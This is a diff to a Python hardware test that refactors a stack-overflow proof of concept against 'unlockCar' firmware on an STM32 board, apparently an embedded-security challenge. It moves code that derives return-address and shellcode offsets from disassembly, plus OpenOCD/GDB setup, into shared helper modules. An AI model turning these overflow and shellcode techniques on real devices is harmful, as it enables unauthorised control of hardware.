@@ -129,6 +129,8 @@ import serial
 PROJECT_ROOT = Path(__file__).resolve().parent.parent
 sys.path.insert(0, str(PROJECT_ROOT / "tools"))
 import openocd  # noqa: E402
+from overflow_offsets import derive_lr_offset_static  # noqa: E402
+import gdb_tools  # noqa: E402
 
 CAR_ID = "319997"  # arbitrary, numeric (SConstruct requires it); distinct from other builds
 GDB_PORT = 34449  # non-default: OpenOCD binds 3333 for its gdbserver even during
@@ -190,40 +192,14 @@ def _derive_overflow_offsets(elf: Path) -> tuple[int, int, int, int]:
     epilogue, skipping the `sub sp, #frame_size` that would normally have
     gotten SP there - $sp has to be set explicitly to match, or `add sp,
     #frame_size` operates on the wrong stack entirely).
-    Fails loudly if the compiled shape no longer matches what this PoC
-    assumes, rather than silently deriving nonsense offsets."""
-    lines = _disasm_lines(elf, "unlockCar")
 
-    push_m = re.search(r"push\s*\{([^}]*)\}", lines[0])
-    assert push_m and "lr" in push_m.group(1), \
-        f"unlockCar's 1st instruction is no longer 'push {{..., lr}}' (got: {lines[0]!r}); PoC needs updating"
-    pushed_regs = [r.strip() for r in push_m.group(1).split(",")]
-
-    sub_m = re.search(r"sub\s+sp,\s*#(\d+)", lines[1])
-    assert sub_m, f"unlockCar's 2nd instruction is no longer 'sub sp, #N' (got: {lines[1]!r}); PoC needs updating"
-    frame_size = int(sub_m.group(1))
-
-    add_m = re.search(r"add\s+r\d+,\s*sp,\s*#(\d+)", lines[2])
-    assert add_m, f"unlockCar's 3rd instruction is no longer 'add rX, sp, #N' (got: {lines[2]!r}); PoC needs updating"
-    buffer_offset = int(add_m.group(1))
-
-    epilogue_addr = None
-    for i in range(len(lines) - 1):
-        m1 = re.search(rf"add\s+sp,\s*#{frame_size}\b", lines[i])
-        if not m1:
-            continue
-        m2 = re.search(r"pop\s*\{([^}]*)\}", lines[i + 1])
-        if m2 and "pc" in m2.group(1):
-            epilogue_addr = int(re.match(r"\s*([0-9a-f]+):", lines[i]).group(1), 16)
-            break
-    assert epilogue_addr is not None, \
-        "Couldn't find unlockCar's 'add sp, #N' / 'pop {..., pc}' epilogue; PoC needs updating"
-
-    pushed_bytes = len(pushed_regs) * 4
-    lr_slot_offset = frame_size + pushed_bytes - 4 - buffer_offset
-    shellcode_offset = lr_slot_offset + 4
-    sp_locals_delta = frame_size + pushed_bytes
-    return lr_slot_offset, shellcode_offset, epilogue_addr, sp_locals_delta
+    Thin wrapper: the actual derivation lives in overflow_offsets.py's
+    derive_lr_offset_static(), shared with test_overflow_derivation.py's
+    Stage 0 checks so this logic isn't duplicated (and drifting) across two
+    test files. See that module for the "fails loudly on a shape mismatch"
+    behavior."""
+    offsets = derive_lr_offset_static(elf, "unlockCar")
+    return offsets.lr_slot_offset, offsets.shellcode_offset, offsets.epilogue_addr, offsets.sp_locals_delta
 
 
 def _assemble_shellcode(loadflag_addr: int, uartwrite_addr: int, tmp_path: Path) -> bytes:
@@ -297,13 +273,9 @@ def test_unlock_overflow_rce_stm32(request, tmp_path):
 
     serial_port = _serial_port_for_probe(probe)
 
-    openocd_proc = subprocess.Popen(
-        ["openocd", "-f", "board/st_nucleo_f4.cfg", "-c", f"adapter serial {probe}",
-         "-c", f"gdb_port {GDB_PORT}", "-c", "telnet_port 44490", "-c", "tcl_port disabled"],
-        cwd=PROJECT_ROOT, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
-    )
+    openocd_proc = gdb_tools.start_openocd_gdbserver("stm32", probe, GDB_PORT)
     try:
-        _wait_for_gdbserver(elf)
+        gdb_tools.wait_for_gdbserver(elf, GDB_PORT)
 
         ser = serial.Serial(serial_port, 115200, timeout=0.2)
         ser.reset_input_buffer()
@@ -350,11 +322,7 @@ detach
                 captured += chunk
         ser.close()
     finally:
-        openocd_proc.terminate()
-        try:
-            openocd_proc.wait(timeout=5)
-        except subprocess.TimeoutExpired:
-            openocd_proc.kill()
+        gdb_tools.stop_openocd(openocd_proc)
 
     print(f"Captured {len(captured)} bytes over HOST_UART: {captured!r}")
 
@@ -366,27 +334,6 @@ detach
         f"HOST_UART via the shellcode's loadFlag()+uart_write() call, but it "
         f"wasn't found in the captured output."
     )
-
-
-def _wait_for_gdbserver(elf: Path, timeout: float = 10.0) -> None:
-    """Poll until OpenOCD's gdbserver on GDB_PORT actually accepts a
-    connection, rather than a fixed sleep - it can take a variable amount of
-    time to come up (or contend with another concurrent OpenOCD/probe use)."""
-    deadline = time.monotonic() + timeout
-    last_output = ""
-    while time.monotonic() < deadline:
-        result = subprocess.run(
-            ["gdb-multiarch", "-batch",
-             "-ex", f"target extended-remote localhost:{GDB_PORT}",
-             "-ex", "detach",
-             str(elf)],
-            capture_output=True, text=True, timeout=5,
-        )
-        last_output = result.stdout + result.stderr
-        if "Remote communication error" not in last_output and "Connection refused" not in last_output:
-            return
-        time.sleep(0.5)
-    raise RuntimeError(f"OpenOCD gdbserver on port {GDB_PORT} never came up:\n{last_output}")
 
 
 def _read_live_sp(elf: Path) -> int:
